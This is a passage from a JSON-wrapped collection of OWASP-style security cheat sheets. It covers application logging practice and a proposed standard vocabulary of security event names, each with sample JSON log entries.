whilst useful for subsequent investigation, it may also need to be treated in some special manner before the event is recorded:\r\n\r\n- File paths\r\n- Database connection strings\r\n- Internal network names and addresses\r\n- Non sensitive personal data (e.g. personal names, telephone numbers, email addresses)\r\n\r\nConsider using personal data de-identification techniques such as deletion, scrambling or pseudonymization of direct and indirect identifiers where the individual's identity is not required, or the risk is considered too great.\r\n\r\nIn some systems, sanitization can be undertaken post log collection, and prior to log display.\r\n\r\n### Customizable logging\r\n\r\nIt may be desirable to be able to alter the level of logging (type of events based on severity or threat level, amount of detail recorded). If this is implemented, ensure that:\r\n\r\n- The default level must provide sufficient detail for business needs\r\n- It should not be possible to completely deactivate application logging or logging of events that are necessary for compliance requirements\r\n- Alterations to the level/extent of logging must be intrinsic to the application (e.g. undertaken automatically by the application based on an approved algorithm) or follow change management processes (e.g. changes to configuration data, modification of source code)\r\n- The logging level must be verified periodically\r\n\r\n### Event collection\r\n\r\nIf your development framework supports suitable logging mechanisms, use or build upon that. Otherwise, implement an application-wide log handler which can be called from other modules/components.\r\n\r\nDocument the interface referencing the organisation-specific event classification and description syntax requirements.\r\n\r\nIf possible create this log handler as a standard module that can be thoroughly tested, deployed in multiple applications, and added to a list of approved & recommended modules.\r\n\r\n- Perform input validation on event data from other trust zones to ensure it is in the correct format (and consider alerting and not logging if there is an input validation failure)\r\n- Perform sanitization on all event data to prevent log injection attacks e.g. carriage return (CR), line feed (LF) and delimiter characters (and optionally to remove sensitive data)\r\n- Encode data correctly for the output (logged) format\r\n- If writing to databases, read, understand, and apply the SQL injection cheat sheet\r\n- Ensure failures in the logging processes/systems do not prevent the application from otherwise running or allow information leakage\r\n- Synchronize time across all servers and devices `Note C`\r\n\r\n**Note C:** This is not always possible where the application is running on a device under some other party's control (e.g. on an individual's mobile phone, on a remote customer's workstation which is on another corporate network). In these cases, attempt to measure the time offset, or record a confidence level in the event timestamp.\r\n\r\nWhere possible, record data in a standard format, or at least ensure it can be exported/broadcast using an industry-standard format.\r\n\r\nIn some cases, events may be relayed or collected together in intermediate points. In the latter some data may be aggregated or summarized before forwarding on to a central repository and analysis system.\r\n\r\n### Verification\r\n\r\nLogging functionality and systems must be included in code review, application testing and security verification processes:\r\n\r\n- Ensure the logging is working correctly and as specified\r\n- Check that events are being classified consistently and the field names, types and lengths are correctly defined to an agreed standard\r\n- Ensure logging is implemented and enabled during application security, fuzz, penetration, and performance testing\r\n- Test the mechanisms are not susceptible to injection attacks\r\n- Ensure there are no unwanted side-effects when logging occurs\r\n- Check the effect on the logging mechanisms when external network connectivity is lost (if this is usually required)\r\n- Ensure logging cannot be used to deplete system resources, for example by filling up disk space or exceeding database transaction log space, leading to denial of service\r\n- Test the effect on the application of logging failures such as simulated database connectivity loss, lack of file system space, missing write permissions to the file system, and runtime errors in the logging module itself\r\n- Verify access controls on the event log data\r\n- If log data is utilized in any action against users (e.g. blocking access, account lock-out), ensure this cannot be used to cause denial of service (DoS) of other users\r\n\r\n### Network architecture\r\n\r\nAs an example, the diagram below shows a service that provides business functionality to customers. We recommend creating a centralized system for collecting logs. There may be many such services, but all of them must securely collect logs in a centralized system.\r\n\r\nApplications of this business service are located in network segments:\r\n\r\n- FRONTEND 1 aka DMZ (UI)\r\n- MIDDLEWARE 1 (business application - service core)\r\n- BACKEND 1 (service database)\r\n\r\nThe service responsible for collecting IT events, including security events, is located in the following segments:\r\n\r\n- BACKEND 2 (log storage)\r\n- MIDDLEWARE 3 - 2 applications:\r\n    - log loader application that download log from storage, pre-processes, and transfer to UI\r\n    - log collector that accepts logs from business applications, other infrastructure, cloud applications and saves in log storage\r\n- FRONTEND 2 (UI for viewing business service event logs)\r\n- FRONTEND 3 (applications that receive logs from cloud applications and transfer logs to log collector)\r\n    - It is allowed to combine the functionality of two applications in one\r\n\r\nFor example, all external requests from users go through the API management service, see application in MIDDLEWARE 2 segment.\r\n\r\n[object Promise]\r\n\r\nAs you can see in the image above, at the network level, the processes of saving and downloading logs require opening different network accesses (ports), arrows are highlighted in different colors. Also, saving and downloading are performed by different applications.\r\n\r\nFull network segmentation cheat sheet by [sergiomarotco](https://github.com/sergiomarotco): [link](https://github.com/sergiomarotco/Network-segmentation-cheat-sheet)\r\n\r\n## Deployment and operation\r\n\r\n### Release\r\n\r\n- Provide security configuration information by adding details about the logging mechanisms to release documentation\r\n- Brief the application/process owner about the application logging mechanisms\r\n- Ensure the outputs of the monitoring (see below) are integrated with incident response processes\r\n\r\n### Operation\r\n\r\nEnable processes to detect whether logging has stopped, and to identify tampering or unauthorized access and deletion (see protection below).\r\n\r\n### Protection\r\n\r\nThe logging mechanisms and collected event data must be protected from mis-use such as tampering in transit, and unauthorized access, modification and deletion once stored. Logs may contain personal and other sensitive information, or the data may contain information regarding the application's code and logic.\r\n\r\nIn addition, the collected information in the logs may itself have business value (to competitors, gossip-mongers, journalists and activists) such as allowing the estimate of revenues, or providing performance information about employees.\r\n\r\nThis data may be held on end devices, at intermediate points, in centralized repositories and in archives and backups.\r\n\r\nConsider whether parts of the data may need to be excluded, masked, sanitized, hashed, or encrypted during examination or extraction.\r\n\r\nAt rest:\r\n\r\n- Build in tamper detection so you know if a record has been modified or deleted\r\n- Store or copy log data to read-only media as soon as possible\r\n- All access to the logs must be recorded and monitored (and may need prior approval)\r\n- The privileges to read log data should be restricted and reviewed periodically\r\n\r\nIn transit:\r\n\r\n- If log data is sent over untrusted networks (e.g. for collection, for dispatch elsewhere, for analysis, for reporting), use a secure transmission protocol\r\n- Consider whether the origin of the event data needs to be verified\r\n- Perform due diligence checks (regulatory and security) before sending event data to third parties\r\n\r\nSee `NIST SP 800-92` Guide to Computer Security Log Management for more guidance.\r\n\r\n### Monitoring of events\r\n\r\nThe logged event data needs to be available to review and there are processes in place for appropriate monitoring, alerting, and reporting:\r\n\r\n- Incorporate the application logging into any existing log management systems/infrastructure e.g. centralized logging and analysis systems\r\n- Ensure event information is available to appropriate teams\r\n- Enable alerting and signal the responsible teams about more serious events immediately\r\n- Share relevant event information with other detection systems, to related organizations and centralized intelligence gathering/sharing systems\r\n\r\n### Disposal of logs\r\n\r\nLog data, temporary debug logs, and backups/copies/extractions, must not be destroyed before the duration of the required data retention period, and must not be kept beyond this time.\r\n\r\nLegal, regulatory and contractual obligations may impact on these periods.\r\n\r\n## Attacks on Logs\r\n\r\nBecause of their usefulness as a defense, logs may be a target of attacks. See also OWASP [Log Injection](https://owasp.org/www-community/attacks/Log_Injection) and [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\r\n\r\n### Confidentiality\r\n\r\nWho should be able to read what? A confidentiality attack enables an unauthorized party to access sensitive information stored in logs.\r\n\r\n- Logs contain PII of users. Attackers gather PII, then either release it or use it as a stepping stone for further attacks on those users.\r\n- Logs contain technical secrets such as passwords. Attackers use it as a stepping stone for deeper attacks.\r\n\r\n### Integrity\r\n\r\nWhich information should be modifiable by whom?\r\n\r\n- An attacker with read access to a log uses it to exfiltrate secrets.\r\n- An attack leverages logs to connect with exploitable facets of logging platforms, such as sending in a payload over syslog in order to cause an out-of-bounds write.\r\n\r\n### Availability\r\n\r\nWhat downtime is acceptable?\r\n\r\n- An attacker floods log files in order to exhaust disk space available for non-logging facets of system functioning. For example, the same disk used for log files might be used for SQL storage of application data.\r\n- An attacker floods log files in order to exhaust disk space available for further logging.\r\n- An attacker uses one log entry to destroy other log entries.\r\n- An attacker leverages poor performance of logging code to reduce application performance\r\n\r\n### Accountability\r\n\r\nWho is responsible for harm?\r\n\r\n- An attacker prevent writes in order to cover their tracks.\r\n- An attacker prevent damages the log in order to cover their tracks.\r\n- An attacker causes the wrong identity to be logged in order to conceal the responsible party.\r\n\r\n## Related articles\r\n\r\n- OWASP [ESAPI Documentation](https://owasp.org/www-project-enterprise-security-api/).\r\n- OWASP [Logging Project](https://owasp.org/www-project-security-logging/).\r\n- IETF [syslog protocol](https://tools.ietf.org/rfc/rfc5424.txt).\r\n- Mitre [Common Event Expression (CEE)](http://cee.mitre.org/) (as of 2014 no longer actively developed).\r\n- NIST [SP 800-92 Guide to Computer Security Log Management](http://csrc.nist.gov/publications/nistpubs/800-92/SP800-92.pdf).\r\n- PCISSC [PCI DSS v2.0 Requirement 10 and PA-DSS v2.0 Requirement 4](https://www.pcisecuritystandards.org/security_standards/documents.php).\r\n- W3C [Extended Log File Format](http://www.w3.org/TR/WD-logfile.html).\r\n- Other [Build Visibility In, Richard Bejtlich, TaoSecurity blog](http://taosecurity.blogspot.co.uk/2009/08/build-visibility-in.html).\r\n- Other [Common Event Format (CEF), Arcsight](https://community.microfocus.com/t5/ArcSight-Connectors/ArcSight-Common-Event-Format-CEF-Implementation-Standard/ta-p/1645557).\r\n- Other [Log Event Extended Format (**LEEF**), IBM](https://www.ibm.com/developerworks/community/wikis/form/anonymous/api/wiki/9989d3d7-02c1-444e-92be-576b33d2f2be/page/3dc63f46-4a33-4e0b-98bf-4e55b74e556b/attachment/a19b9122-5940-4c89-ba3e-4b4fc25e2328/media/QRadar_LEEF_Format_Guide.pdf).\r\n- Other [Common Log File System (CLFS), Microsoft](http://msdn.microsoft.com/en-us/library/windows/desktop/bb986747(v=vs.85).aspx).\r\n- Other [Building Secure Applications: Consistent Logging, Rohit Sethi & Nish Bhalla, Symantec Connect](http://www.symantec.com/connect/articles/building-secure-applications-consistent-logging).\r\n"
    },
    {
      "Logging_Vocabulary_Cheat_Sheet.md": "# Application Logging Vocabulary Cheat Sheet\r\n\r\nThis document proposes a standard vocabulary for logging security events. The intent is to simplify monitoring and alerting such that, assuming developers trap errors and log them using this vocabulary, monitoring and alerting would be improved by simply keying on these terms.\r\n\r\n## Overview\r\n\r\nEach year IBM Security commissions the Ponemon Institute to survey companies around the world for information related to security breaches, mitigation, and the associated costs; the result is called the Cost of a Data Breach Report.\r\n\r\nIn addition to the millions of dollars lost due to breaches the report finds that the **mean time to identify** a breach continues to hover around **200 days**. Clearly our ability to monitor applications and alert on anomalous behavior would improve our time to identify and mitigate an attack against our applications.\r\n\r\n[object Promise]\r\n\r\n> IBM Cost of a Data Breach Study 2020, Fig.34, pg.52, [https://www.ibm.com/security/data-breach]\r\n\r\nThis logging standard would seek to define specific keywords which, when applied consistently across software, would allow groups to simply monitor for these events terms across all applications and respond quickly in the event of attack.\r\n\r\n## Assumptions\r\n\r\n- Observability/SRE groups must support the use of this standard and encourage developers to use it\r\n- Incident Response must either ingest this data OR provide a means by which other monitoring teams can send a notification of alert, preferably programmatically.\r\n- Architects must support, adopt, and contribute to this standard\r\n- Developers must embrace this standard and begin to implement (requires knowledge and intent to understand potential attacks and trap those errors in code).\r\n\r\n## Getting Started\r\n\r\nAs a reminder, the goal of logging is to be able to alert on specific security events. Of course, the first step to logging these events is good error handling, if you're not trapping the events, you don't have an event to log.\r\n\r\n### Identifying Events\r\n\r\nIn order to better understand security event logging a good high-level understanding of threat modeling would be helpful, even if it's a simple approach of:\r\n\r\n1. **What could go wrong?**\r\n\r\n- Orders: could someone order on behalf of another?\r\n- Authentication: could I log in as someone else?\r\n- Authorization: could I see someone else' account?\r\n\r\n2. **What would happen if it did?**\r\n\r\n- Orders: I've placed an order on behalf of another... to an abandoned warehouse in New Jersey. Oops.\r\n- Then I bragged about it on 4Chan.\r\n- Then I told the New York Times about it.\r\n\r\n3. **Who might intend to do this?**\r\n\r\n- Intentional attacks by hackers.\r\n- An employee \"testing\" how things work.\r\n- An API coded incorrectly doing things the author did not intend.\r\n\r\n## Format\r\n\r\n_NOTE: All dates should be logged in [ISO 8601](https://en.wikipedia.org/wiki/ISO_8601) format **WITH** UTC offset to ensure maximum portability_\r\n\r\n```\r\n{\r\n    \"datetime\": \"2021-01-01T01:01:01-0700\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"AUTHN_login_success:joebob1\",\r\n    \"level\": \"INFO\",\r\n    \"description\": \"User joebob1 login successfully\",\r\n    \"useragent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\",\r\n    \"source_ip\": \"165.225.50.94\",\r\n    \"host_ip\": \"10.12.7.9\",\r\n    \"hostname\": \"portalauth.foobar.com\",\r\n    \"protocol\": \"https\",\r\n    \"port\": \"440\",\r\n    \"request_uri\": \"/api/v2/auth/\",\r\n    \"request_method\": \"POST\",\r\n    \"region\": \"AWS-US-WEST-2\",\r\n    \"geo\": \"USA\"\r\n}\r\n```\r\n\r\n## The Vocabulary\r\n\r\nWhat follows are the various event types that should be captured. For each event type there is a prefix like \"authn\" and additional data that should be included for that event.\r\n\r\nPortions of the full logging format are included for example, but a complete event log should follow the format above.\r\n\r\n---\r\n\r\n## Authentication [AUTHN]\r\n\r\n### authn_login_success[:userid]\r\n\r\n**Description**\r\nAll login events should be recorded including success.\r\n\r\n**Level:**\r\nINFO\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authn_login_success:joebob1\",\r\n    \"level\": \"INFO\",\r\n    \"description\": \"User joebob1 login successfully\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authn_login_successafterfail[:userid,retries]\r\n\r\n**Description**\r\nThe user successfully logged in after previously failing.\r\n\r\n**Level:**\r\nINFO\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authn_login_successafterfail:joebob1,2\",\r\n    \"level\": \"INFO\",\r\n    \"description\": \"User joebob1 login successfully\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authn_login_fail[:userid]\r\n\r\n**Description**\r\nAll login events should be recorded including failure.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authn_login_fail:joebob1\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 login failed\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authn_login_fail_max[:userid,maxlimit(int)]\r\n\r\n**Description**\r\nAll login events should be recorded including failure.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authn_login_fail_max:joebob1,3\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 reached the login fail limit of 3\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authn_login_lock[:userid,reason]\r\n\r\n**Description**\r\nWhen the feature exists to lock an account after x retries or other condition, the lock should be logged with relevant data.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Reasons:**\r\n\r\n- maxretries: The maximum number of retries was reached\r\n- suspicious: Suspicious activity was observed on the account\r\n- customer: The customer requested their account be locked\r\n- other: Other\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authn_login_lock:joebob1,maxretries\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 login locked because maxretries exceeded\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authn_password_change[:userid]\r\n\r\n**Description**\r\nEvery password change should be logged, including the userid that it was for.\r\n\r\n**Level:**\r\nINFO\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authn_password_change:joebob1\",\r\n    \"level\": \"INFO\",\r\n    \"description\": \"User joebob1 has successfully changed their password\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authn_password_change_fail[:userid]\r\n\r\n**Description**\r\nAn attempt to change a password that failed. May also trigger other events such as `authn_login_lock`.\r\n\r\n**Level:**\r\nINFO\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authn_password_change:joebob1\",\r\n    \"level\": \"INFO\",\r\n    \"description\": \"User joebob1 failed to changing their password\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authn_impossible_travel[:userid,region1,region2]\r\n\r\n**Description**\r\nWhen a user is logged in from one city and suddenly appears in another, too far away to have traveled in a reasonable timeframe, this often indicates a potential account takeover.\r\n\r\n**Level:**: CRITICAL\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authn_impossible_travel:joebob1,US-OR,CN-SH\",\r\n    \"level\": \"CRITICAL\",\r\n    \"description\": \"User joebob1 has accessed the application in two distant cities at the same time\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authn_token_created[:userid, entitlement(s)]\r\n\r\n**Description**\r\nWhen a token is created for service access it should be recorded\r\n\r\n**Level:**: INFO\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"aws.foobar.com\",\r\n    \"event\": \"authn_token_created:app.foobarapi.prod,create,read,update\",\r\n    \"level\": \"INFO\",\r\n    \"description\": \"A token has been created for app.foobarapi.prod with create,read,update\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authn_token_revoked[:userid,tokenid]\r\n\r\n**Description**\r\nA token has been revoked for the given account.\r\n\r\n**Level:**: INFO\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"aws.foobar.com\",\r\n    \"event\": \"authn_token_revoked:app.foobarapi.prod,xyz-abc-123-gfk\",\r\n    \"level\": \"INFO\",\r\n    \"description\": \"Token ID: xyz-abc-123-gfk was revoked for user app.foobarapi.prod\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authn_token_reuse[:userid,tokenid]\r\n\r\n**Description**\r\nA previously revoked token was attempted to be reused.\r\n\r\n**Level:**: CRITICAL\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"aws.foobar.com\",\r\n    \"event\": \"authn_token_reuse:app.foobarapi.prod,xyz-abc-123-gfk\",\r\n    \"level\": \"CRITICAL\",\r\n    \"description\": \"User app.foobarapi.prod attempted to use token ID: xyz-abc-123-gfk which was previously revoked\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authn_token_delete[:appid]\r\n\r\n**Description**\r\nWhen a token is deleted it should be recorded\r\n\r\n**Level:**: WARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authn_token_delete:foobarapi\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"The token for foobarapi has been deleted\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## Authorization [AUTHZ]\r\n\r\n---\r\n\r\n### authz_fail[:userid,resource]\r\n\r\n**Description**\r\nAn attempt was made to access a resource which was unauthorized\r\n\r\n**Level:**: CRITICAL\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authz_fail:joebob1,resource\",\r\n    \"level\": \"CRITICAL\",\r\n    \"description\": \"User joebob1 attempted to access a resource without entitlement\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authz_change[:userid,from,to]\r\n\r\n**Description**\r\nThe user or entity entitlements was changed\r\n\r\n**Level:**: WARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authz_change:joebob1,user,admin\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 access was changed from user to admin\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### authz_admin[:userid,event]\r\n\r\n**Description**\r\nAll activity by privileged users such as admin should be recorded.\r\n\r\n**Level:**: WARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"authz_admin:joebob1,user_privilege_change\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"Administrtator joebob1 has updated privileges of user foobarapi from user to admin\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## Excessive Use [EXCESS]\r\n\r\n### excess_rate_limit_exceeded[userid,max]\r\n\r\n**Description**\r\nExpected service limit ceilings should be established and alerted when exceeded, even if simply for managing costs and scaling.\r\n\r\n**Level:**: WARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"excess_rate_limit_exceeded:app.foobarapi.prod,100000\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User app.foobarapi.prod has exceeded max:100000 requests\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## File Upload [UPLOAD]\r\n\r\n### upload_complete[userid,filename,type]\r\n\r\n**Description**\r\nOn successful file upload the first step in the validation process is that the upload has completed.\r\n\r\n**Level:**: INFO\r\n\r\n**Example:**\r\n\r\n```\r\n    {\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"upload_complete:joebob1,user_generated_content.png,PNG\",\r\n    \"level\": \"INFO\",\r\n    \"description\": \"User joebob1 has uploaded user_generated_content.png\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### upload_stored[filename,from,to]\r\n\r\n**Description**\r\nOne step in good file upload validation is to move/rename the file and when providing the content back to end users, never reference the original filename in the download. This is true both when storing in a filesystem as well as in block storage.\r\n\r\n**Level:**: INFO\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"upload_stored:user_generated_content.png,kjsdhkrjhwijhsiuhdf000010202002\",\r\n    \"level\": \"INFO\",\r\n    \"description\": \"File user_generated_content.png was stored in the database with key abcdefghijk101010101\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### upload_validation[filename,(virusscan|imagemagick|...):(FAILED|incomplete|passed)]\r\n\r\n**Description**\r\nAll file uploads should have some validation performed, both for correctness (is in fact of file type x), and for safety (does not contain a virus).\r\n\r\n**Level:**: INFO|CRITICAL\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"upload_validation:filename,virusscan:FAILED\",\r\n    \"level\": \"CRITICAL\",\r\n    \"description\": \"File user_generated_content.png FAILED virus scan and was purged\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### upload_delete[userid,fileid]\r\n\r\n**Description**\r\nWhen a file is deleted for normal reasons it should be recorded.\r\n\r\n**Level:**: INFO\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"upload_delete:joebob1,\",\r\n    \"level\": \"INFO\",\r\n    \"description\": \"User joebob1 has marked file abcdefghijk101010101 for deletion.\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## Input Validation [INPUT]\r\n\r\n### input_validation_fail[:field,userid]\r\n\r\n**Description**\r\nWhen input validation fails on the server-side it must either be because a) sufficient validation was not provided on the client, or b) client-side validation was bypassed. In either case it's an opportunity for attack and should be mitigated quickly.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"input_validation_fail:date_of_birth,joebob1\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 submitted data that failed validation.\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## Malicious Behavior [MALICIOUS\r\n\r\n### malicious_excess_404:[userid|IP,useragent]\r\n\r\n**Description**\r\nWhen a user makes numerous requests for files that don't exist it often is an indicator of attempts to \"force-browse\" for files that could exist and is often behavior indicating malicious intent.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"malicious_excess404:123.456.789.101,M@l1c10us-Hax0rB0t0-v1\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"A user at 123.456.789.101 has generated a large number of 404 requests.\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### malicious_extraneous:[userid|IP,inputname,useragent]\r\n\r\n**Description**\r\nWhen a user submits data to a backend handler that was not expected it can indicate probing for input validation errors. If your backend service receives data it does not handle or have an input for this is an indication of likely malicious abuse.\r\n\r\n**Level:**\r\nCRITICAL\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"malicious_extraneous:dr@evil.com,creditcardnum,Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User dr@evil.com included field creditcardnum in the request which is not handled by this service.\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### malicious_attack_tool:[userid|IP,toolname,useragent]\r\n\r\n**Description**\r\nWhen obvious attack tools are identified either by signature or by user agent they should be logged.\r\n\r\n**TODO:** A future version of this standard should link to known attack tools, signatures and user-agent strings. For instance, the tool \"Nikto\" leaves behind its user agent by default with a string like **_\"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)\"_**\r\n\r\n**Level:**\r\nCRITICAL\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"malicious_attack_tool:127.0.0.1,nikto,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"Attack traffic indicating use of Nikto coming from 127.0.0.1\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### malicious_cors:[userid|IP,useragent,referer]\r\n\r\n**Description**\r\nWhen attempts are made from unauthorized origins they should of course be blocked, but also logged whenever possible. Even if we block an illegal cross-origin request the fact that the request is being made could be an indication of attack.\r\n\r\n_NOTE: Did you know that the word \"referer\" is misspelled in the original HTTP specification? The correct spelling should be \"referrer\" but the original typo persists to this day and is used here intentionally._\r\n\r\n**Level:**\r\nCRITICAL\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"malicious_cors:127.0.0.1,Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0,attack.evil.com\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"An illegal cross-origin request from 127.0.0.1 was referred from attack.evil.com\"\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### malicious_direct_reference:[userid|IP, useragent]\r\n\r\n**Description**\r\nA common attack against authentication and authorization is to directly access an object without credentials or appropriate access authority. Failing to prevent this flaw used to be one of the OWASP Top Ten called **Insecure Direct Object Reference**. Assuming you've correctly prevented this attack, logging the attempt is valuable to identify malicious users.\r\n\r\n**Level:**\r\nCRITICAL\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"malicious_direct:joebob1, Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 attempted to access an object to which they are not authorized\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## Privilege Changes [PRIVILEGE]\r\n\r\nThis section focuses on object privilege changes such as read/write/execute permissions or objects in a database having authorization meta-information changed.\r\n\r\nChanges to user/account are covered in the User Management section.\r\n\r\n---\r\n\r\n### privilege_permissions_changed:[userid,file|object,fromlevel,tolevel]\r\n\r\n**Description**\r\nTracking changes to objects to which there are access control restrictions can uncover attempt to escalate privilege on those files by unauthorized users.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"malicious_direct:joebob1, /users/admin/some/important/path,0511,0777\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 changed permissions on /users/admin/some/important/path\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## Sensitive Data Changes 